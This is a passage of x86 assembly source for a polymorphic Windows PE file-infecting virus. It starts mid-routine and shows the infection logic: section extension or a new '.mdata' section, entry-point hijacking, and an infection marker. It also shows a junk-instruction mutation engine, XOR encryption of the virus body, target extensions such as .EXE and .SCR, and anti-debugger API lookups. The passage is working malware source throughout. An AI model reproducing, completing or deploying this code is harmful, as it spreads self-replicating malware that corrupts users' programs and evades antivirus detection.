	je err_InfectFile
	imul eax, x
	add esi, eax

        in al, 40h                           ;select how to infect file
	and al, 2
	je NextWayOfInfection

	push [esi.SH_SizeOfRawData - x]
	lea edi, [esi.SH_VirtualSize - x]
        sub dword ptr [edi], Start - virtual_end   ;new virtual size
	mov eax, [edi]

	push edx
	mov ecx, [edx.NT_OptionalHeader.OH_FileAlignment]
	cdq
	div ecx
	inc eax
	mul ecx
        mov [esi.SH_SizeOfRawData - x], eax     ;new SizeOfRawData
	mov ecx, eax
	pop edx

	mov eax, [ebx + Entrypoint]
	push [edx.NT_OptionalHeader.OH_AddressOfEntryPoint]
	pop [ebx + Entrypoint]

	pop edi
	push eax
	sub ecx, edi
        add [edx.NT_OptionalHeader.OH_SizeOfImage], ecx   ;new SizeOfImage

        or [esi.SH_Characteristics.hiw.hib - x], 0e0h     ;change flags
	mov eax, [esi.SH_PointerToRawData - x]
	add eax, edi
	mov ecx, [ebx + WFD.WFD_nFileSizeLow]
	add edi, ecx
	sub edi, eax
	mov esi, [esi.SH_VirtualAddress - x]
	add esi, edi
        mov [edx.NT_OptionalHeader.OH_AddressOfEntryPoint], esi  ;new EP
	pop eax

copy_virus:
	pop edi
        mov byte ptr [edi.MZ_res2], 1        ;set "already infected" mark
	add edi, ecx

        pushad                              ;POLY ENGINE STARTS HERE...
rep_1:  call get_reg                        ;load random register
        mov dl, al                          
        add al, 58h                         ;create POP reg
        mov byte ptr [ebx + @1], al         ;store it
        lea edi, [ebx + @2+1]               ;and aply registry changes
        call mask_it                        ;to all needed
        lea edi, [ebx + @3]                 ;instructions
        call mask_it                        ;...
rep_2:  call get_reg                        ;get random register
        cmp al, dl                          ;mustnt be previous register
	je rep_2
	mov dh, al
	xchg dl, dh
        add al, 0b8h                        ;create MOV instruction
        mov byte ptr [ebx + @4], al         ;store it
        lea edi, [ebx + @5]                 ;and aply changes
	call mask_it
	push eax
        in al, 40h                       
	and al, 1
	je _test_
        mov al, 0bh                         ;OR reg, reg
	jmp _write
_test_: mov al, 85h                         ;TEST reg, reg
_write: mov byte ptr [ebx + @6-1], al       ;store it
	pop eax
	lea edi, [ebx + @6]
	mov al, [edi]
	and al, 11000000b
	add al, dl
	ror al, 3
	add al, dl
	rol al, 3
	stosb
rep_3:  call get_reg                        ;get random register
        cmp al, dl                          ;mustnt be previous register
	je rep_3
	cmp al, dh
	je rep_3
        cmp al, 101b                        ;mustnt be EBP
        je rep_3                            ;(due to instr. incompatibility)

	mov dl, al
	lea edi, [ebx + @3]
	mov al, [edi]
	and al, 11000111b
	ror al, 3
	add al, dl
	rol al, 3
	stosb
	lea edi, [ebx + @7]
	call mask_it
	lea edi, [ebx + @8]
	call mask_it
	lea esi, [ebx + junx]
gen_j:  lodsd                               ;junk instructions generator
	xchg eax, ecx
	jecxz end_mutate
	mov edi, ecx
	add edi, ebx
	xor eax, eax
	in al, 40h
	and al, 1
	je _2&1_
	push esi
	lea esi, [ebx + junx3]
	in al, 40h
	and al, num_junx3-1
	add esi, eax
	movsb
	movsb
	in al, 40h
	stosb
	jmp _gen_j
_2&1_:	push esi
	in al, 40h
	and al, 1
	je twofirst
	call one_byte
	call two_byte
	jmp _gen_j
twofirst:
	call two_byte
	call one_byte
_gen_j: pop esi
	jmp gen_j
end_mutate:
	popad
	push eax
        in al, 40h                          ;create 32bit key
	mov ah, al
	in al, 40h
	shl eax, 16
	in al, 40h
	mov ah, al
	in al, 40h
        mov dword ptr [ebx + key], eax      ;store it

	push edi
        mov edx, (virus_end-Start+3)/4      ;copy virus body to internal
        lea esi, [ebx + Start]              ;buffer
	mov ecx, edx
	lea edi, [ebx + buffer]
	rep movsd

	xor ecx, ecx
	lea esi, [ebx + buffer - Start + encrypted]
crypt:  xor [esi], eax                      ;encrypt virus body
	add esi, 4
	inc ecx
	cmp ecx, (virus_end-encrypted+3)/4
	jne crypt

	pop edi
	pop eax
	lea esi, [ebx + buffer]
	mov ecx, edx

        inc dword ptr [ebx + GenerationCount]   ;increment generation count
        rep movsd                               ;copy virus
        mov [ebx + Entrypoint], eax             ;restore variable after
        mov al, 3                               ;copy stage
	jmp if_n

err_InfectFile:
	mov al, 4
        mov [ebx + nclosefile_mode], al                       ;dendrit
if_n:   mov [ebx + nClF_synapse], offset pfNeuron_InfectFile  ;synapse
	push [ebx + pfNeuron_CloseFile]
        call [ebx + ddSwitchToFiber]            ;switch to neuron

end_InfectFile:
	push [ebx + WFD.WFD_dwFileAttributes]
	lea esi, [ebx + WFD.WFD_szFileName]
	push esi
        call [ebx + ddSetFileAttributesA]       ;set back file attributes

end_IF:	push [ebx + dwThreadID]
nIF_synapse = dword ptr $ - 4
        call [ebx + ddSwitchToFiber]            ;jump to previous neuron
	jmp n_infectfile


NextWayOfInfection:                             ;create new section
	mov edi, edx
	inc word ptr [edi.NT_FileHeader.FH_NumberOfSections]
	mov eax, [esi.SH_VirtualAddress - x]
	add eax, [esi.SH_VirtualSize - x]
	mov ecx, [edi.NT_OptionalHeader.OH_SectionAlignment]
	cdq
	div ecx
	test edx, edx
	je next_1
	inc eax
next_1:	mul ecx
        mov [ebx + s_RVA], eax                  ;new RVA

	mov ecx, [ebx + Entrypoint]
	push ecx
	push [edi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	pop [ebx + Entrypoint]
        mov [edi.NT_OptionalHeader.OH_AddressOfEntryPoint], eax    ;new EP

	mov ecx, [edi.NT_OptionalHeader.OH_FileAlignment]
	mov eax, virtual_end - Start
	div ecx
	inc eax
	mul ecx
        mov [ebx + s_RAWSize], eax              ;new SizeOfRawData
        add [edi.NT_OptionalHeader.OH_SizeOfImage], eax
                                                ;new SizeOfImageBase

	mov ecx, [ebx + WFD.WFD_nFileSizeLow]
        mov [ebx + s_RAWPtr], ecx               ;new PointerToRawData
	push ecx
	mov edi, esi
	lea esi, [ebx + new_section]
	mov ecx, (IMAGE_SIZEOF_SECTION_HEADER+3)/4
        rep movsd                               ;copy section
	pop ecx
	pop eax
        jmp copy_virus                          ;and copy virus body

ni_seh: @SEH_RemoveFrame                        ;remove SEH frame
	popad
	jmp end_IF
Neuron_InfectFile	EndP

;------------------------------------------------------------------------------- 

one_byte:
	lea esi, [ebx + junx1]
	in al, 40h
	and al, num_junx1-1
	add esi, eax
	movsb
	ret
two_byte:
	lea esi, [ebx + junx2]
	in al, 40h
	and al, num_junx2-1
	add esi, eax
	movsb
	in al, 40h
	and al, 7
	add al, 11000000b
	stosb
	ret
get_reg:
	in al, 40h
	and al, 7
	je get_reg
	cmp al, 4
	je get_reg
	ret
mask_it:
	mov al, [edi]
	and al, 11111000b
	add al, dl
	stosb
	ret

;------------------------------------------------------------------------------- 

Neuron_Addresses:	dd		offset Neuron_Main
			dd		offset Neuron_Debugger
			dd		offset Neuron_FindFile
			dd		offset Neuron_CheckFile
			dd		offset Neuron_OpenFile
			dd		offset Neuron_CloseFile
			dd		offset Neuron_InfectFile
num_of_neurons	=	(byte ptr $ - offset Neuron_Addresses) / 4

junx1:			nop
			dec eax
			cmc
			inc eax
			clc
			cwde
			stc
			lahf
num_junx1 = 8
junx2:			db	8bh		;mov ..., ...
			db	03h		;add ..., ...
			db	13h		;adc ..., ...
			db	2dh		;sub ..., ...
			db	1bh		;sbb ..., ...
			db	0bh		;or ..., ...
			db	33h		;xor ..., ...
			db	23h		;and ..., ...
			db	33h		;test ..., ...
num_junx2 = 9
junx3:			db	0c1h, 0c0h	;rol eax, ...
			db	0c1h, 0e0h	;shl eax, ...
			db	0c1h, 0c8h	;ror eax, ...
			db	0c1h, 0e8h	;shr eax, ...
			db	0c1h, 0d0h	;rcl eax, ...
			db	0c1h, 0f8h	;sar eax, ...
			db	0c1h, 0d8h	;rcr eax, ...
num_junx3 = 7
junx:			irp Num, <1,2,3,4,5,6,7,8,9>
			dd	offset @j&Num
			endm
			dd	0

GenerationCount		dd		?
Entrypoint		dd		offset ExitProcess - 400000h

szExe			db		'*.EXE', 0
szScr			db		'*.SCR', 0
szBak			db		'*.BAK', 0
szDat			db		'*.DAT', 0
szSfx			db		'*.SFX', 0
num_of_exts		=		5
dotdot			db		'..', 0


dtavTBAV		db		'anti-vir.dat', 0

string_subs:						;string substitutes
			db	'File', 0
			db	'Get', 0
			db	'Set', 0
			db	'Module', 0
			db	'Handle', 0
			db	'Create', 0
			db	'Find', 0
			db	'Close', 0
			db	'ViewOf', 0
			db	'CurrentDirectoryA', 0
			db	'Fiber', 0
			db	'Thread', 0
			db	'Delete', 0
			db	'Library', 0
new_section:
s_name			db		'.mdata', 0, 0
s_vsize			dd		virtual_end - Start
s_RVA			dd		0
s_RAWSize		dd		0
s_RAWPtr		dd		0
			dd		0, 0, 0
s_flags			dd		0e0000000h


virus_end:

strings:
szKernel32		db		'KERNEL32', 0
szKernel32W		dw		'K','E','R','N','E','L','3','2', 0
szUser32		db		'USER32', 0

szGetModuleHandleA	db		'GetModuleHandleA', 0
szGetModuleHandleW	db		'GetModuleHandleW', 0

szAPIs:
szCreateThread		db		'CreateThread', 0
szWaitForSingleObject	db		'WaitForSingleObject', 0
szCloseHandle		db		'CloseHandle', 0
szConvertThreadToFiber	db		'ConvertThreadToFiber', 0
szCreateFiber		db		'CreateFiber', 0
szSwitchToFiber		db		'SwitchToFiber', 0
szDeleteFiber		db		'DeleteFiber', 0
szGetVersion		db		'GetVersion', 0
szFindFirstFileA	db		'FindFirstFileA', 0
szFindNextFileA		db		'FindNextFileA', 0
szFindClose		db		'FindClose', 0
szCreateFileA		db		'CreateFileA', 0
szCreateFileMappingA	db		'CreateFileMappingA', 0
szMapViewOfFile		db		'MapViewOfFile', 0
szUnmapViewOfFile	db		'UnmapViewOfFile', 0
szSetFileAttributesA	db		'SetFileAttributesA', 0
szSetFilePointer	db		'SetFilePointer', 0
szSetEndOfFile		db		'SetEndOfFile', 0
szSetFileTime		db		'SetFileTime', 0
szGetCurrentDirectoryA	db		'GetCurrentDirectoryA', 0
szSetCurrentDirectoryA	db		'SetCurrentDirectoryA', 0
szDeleteFileA		db		'DeleteFileA', 0
szLoadLibraryA		db		'LoadLibraryA', 0
szFreeLibraryA		db		'FreeLibrary', 0
szIsDebuggerPresent	db		'IsDebuggerPresent', 0
			db		0ffh

ddAPIs:
ddCreateThread		dd		?
ddWaitForSingleObject	dd		?
ddCloseHandle		dd		?
ddConvertThreadToFiber	dd		?
ddCreateFiber		dd		?
ddSwitchToFiber		dd		?
ddDeleteFiber		dd		?
ddGetVersion		dd		?
ddFindFirstFileA	dd		?
ddFindNextFileA		dd		?
ddFindClose		dd		?
ddCreateFileA		dd		?
ddCreateFileMappingA	dd		?
ddMapViewOfFile		dd		?
ddUnmapViewOfFile	dd		?
ddSetFileAttributesA	dd		?
ddSetFilePointer	dd		?
ddSetEndOfFile		dd		?
ddSetFileTime		dd		?
ddGetCurrentDirectoryA	dd		?
ddSetCurrentDirectoryA	dd		?
ddDeleteFileA		dd		?
ddLoadLibraryA		dd		?
ddFreeLibraryA		dd		?
ddIsDebuggerPresent	dd		?

dwThreadID		dd		?

Fiber_Addresses:
pfMain			dd		?
pfNeuron_Main		dd		?
pfNeuron_Debugger	dd		?
pfNeuron_FindFile	dd		?
pfNeuron_CheckFile	dd		?
pfNeuron_OpenFile	dd		?
pfNeuron_CloseFile	dd		?
pfNeuron_InfectFile	dd		?

hFile			dd		?
hMapFile		dd		?
lpFile			dd		?

SearchHandle		dd		?
CurDir			db	MAX_PATH dup (?)
WFD		WIN32_FIND_DATA		?
buffer			db		virus_end - Start + 1	dup	(?)

virtual_end:

_GetModuleHandleA	dd	offset GetModuleHandleA
_GetModuleHandleW	dd	offset GetModuleHandleW

ends
End Start





